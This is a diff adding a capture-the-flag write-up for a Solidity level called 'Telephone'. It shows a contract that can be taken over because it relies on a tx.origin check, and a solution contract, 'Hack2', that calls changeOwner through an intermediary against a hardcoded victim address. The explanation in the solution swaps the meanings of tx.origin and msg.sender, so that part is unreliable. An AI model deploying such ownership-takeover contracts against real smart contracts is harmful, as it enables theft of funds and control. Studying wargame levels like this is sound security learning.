@@ -1,0 +1,47 @@
+Telephone
+Difficulty 1/10
+
+Claim ownership of the contract below to complete this level.
+
+  Things that might help
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+Solution:
+
+We have to create a smart contract that call the function changeOwner of the contract Telephone. tx is the inmediate sender of the transaction. msg.sender
+is who initialize the msg. I create this script to solve it:
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.1;
+
+interface ITelephone {
+   function changeOwner(address _owner) external;
+}
+
+contract Hack2 {
+    address victim = 0xc5aE423c389f6b290234D101f82c3276F4DF6954;
+
+    function atack() public {
+        ITelephone telephone = ITelephone(victim);
+        telephone.changeOwner(msg.sender);
+
+    }
+}
